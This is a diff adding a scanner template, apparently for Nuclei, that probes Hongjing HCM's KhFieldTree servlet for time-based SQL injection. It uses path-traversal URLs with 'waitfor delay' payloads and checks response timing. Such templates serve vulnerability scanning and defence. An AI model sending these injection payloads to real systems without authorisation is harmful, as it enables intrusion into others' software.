@@ -1,0 +1,23 @@
+id: hongjing-subsys-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 宏景HCM KhFieldtree接口SQL注入.
+  reference:
+    - https://github.com/zan8in/afrog/blob/6a62bac4faaf65ad7bd16961da9980ebaaee6926/pocs/afrog-pocs/vulnerability/potential-hjsoft-hcm-khfieldtree-sqli.yaml#L19
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/templates/attestation/%2e%2e/%2e%2e/servlet/performance/KhFieldTree?pointsetid=-1&subsys_id=11'waitfor+delay+'0:0:3'--+"
+      - "{{BaseURL}}/templates/attestation/%2e%2e/%2e%2e/servlet/performance/KhFieldTree?pointsetid=-1&subsys_id=11'waitfor+delay+'0:0:6'--+"
+      - "{{BaseURL}}/templates/attestation/%2e%2e/%2e%2e/servlet/performance/KhFieldTree?pointsetid=-1&subsys_id=11'waitfor+delay+'0:0:9'--+"
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
